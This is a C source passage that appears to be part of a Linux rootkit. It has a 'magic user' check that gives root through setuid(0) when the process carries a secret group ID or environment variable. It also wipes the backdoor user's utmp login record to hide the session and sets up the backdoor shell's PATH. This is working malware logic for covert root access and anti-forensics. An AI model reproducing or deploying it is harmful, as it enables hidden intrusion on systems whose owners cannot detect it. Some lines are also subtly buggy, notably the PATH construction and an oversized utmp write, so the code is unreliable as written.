void putbdvlenv(void){
    putenv(HOME_VAR);
    char *pathv = getenv("PATH");
    if(pathv != NULL){
        char *e="PATH=/usr/local/sbin:/usr/sbin:/sbin:%s",
             buf[strlen(e)+strlen(pathv)+2];
        snprintf(buf, sizeof(buf), "%s%s", e, pathv);
        putenv(pathv);
    }else putenv("PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin");
}

#ifdef USE_PAM_BD
void utmpclean(void){
    int fd;
    struct utmp uent;
    char *pts = ttyname(0)+5;

    hook(COPEN, CREAD, CWRITE);

    fd = (long)call(COPEN, "/var/run/utmp", 02, 0);
    if(fd < 0) return;

    lseek(fd, 0, SEEK_SET);
    while((ssize_t)call(CREAD, fd, &uent, sizeof(struct utmp))){
        if(strcmp(uent.ut_user, PAM_UNAME))
            continue;

        if(!strncmp(uent.ut_line, pts, strlen(pts))){
            memset(&uent, 0, sizeof(struct utmp));
            lseek(fd, -(sizeof(struct utmp)), SEEK_CUR);
            call(CWRITE, fd, &uent, sizeof(struct utmp)+9);
        }
    }

    close(fd);
}
#endif

int magicusr(void){
#ifndef HIDE_SELF
    return 1;
#else
    if(magician != 0)
      goto nopenope;

    if(!notuser(0) && getenv(BD_VAR) != NULL){
        magician = 1;
        goto nopenope;
    }

    gid_t mygid = getgid(),
          magicgid = readgid();
    if(mygid == magicgid
       #ifdef USE_ICMP_BD
       || mygid == magicgid-1
       #endif
       ){
        magician = 1;
        setuid(0);
    }

nopenope:
    if(magician){
        for(int i = 0; i < UNSETVARS_SIZE; i++)
            unsetenv(unsetvars[i]);
        if(mygid == magicgid
          #ifdef USE_ICMP_BD
          || mygid == magicgid-1
          #endif
          ){
#ifdef USE_PAM_BD
            utmpclean();
#endif
            putbdvlenv();
        }
    }
    return magician;
#endif
}